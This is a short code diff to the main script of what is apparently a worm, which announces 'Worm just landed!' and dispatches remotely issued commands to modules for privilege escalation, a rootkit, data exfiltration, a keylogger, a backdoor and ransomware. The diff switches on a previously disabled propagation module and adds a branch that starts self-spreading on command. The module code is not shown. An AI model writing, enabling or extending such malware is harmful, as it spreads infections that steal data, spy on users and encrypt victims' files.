@@ -6,7 +6,7 @@ from time import sleep
 
 from modules import privesc
 from modules import rootkit
-# from modules import propagation
+from modules import propagation
 from modules import exfiltration
 from modules import keylogger
 from modules import backdoor
@@ -23,15 +23,14 @@ from modules import ransomware
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
-
 def main():
     print("Worm just landed!")
 
-    # map modules to function
+    # Map modules to function
     modules = {
         "privesc": privesc.run,
         "rootkit": rootkit.run,
-        # "propagation": propagation.run,
+        "propagation": propagation.run,
         "exfiltration": exfiltration.run,
         "keylogger": keylogger.run,
         "backdoor": backdoor.run,
@@ -68,6 +67,9 @@ def main():
                     ransomware.encrypt_ransomware()
                 elif result[1] == "decrypt":
                     instructions.download_secret_key()
+
+            elif result[0] == "propagation":
+                if result[1] == "start": propagation.run()
 
             if result != "no_data":
                 instructions.reset_instruction()
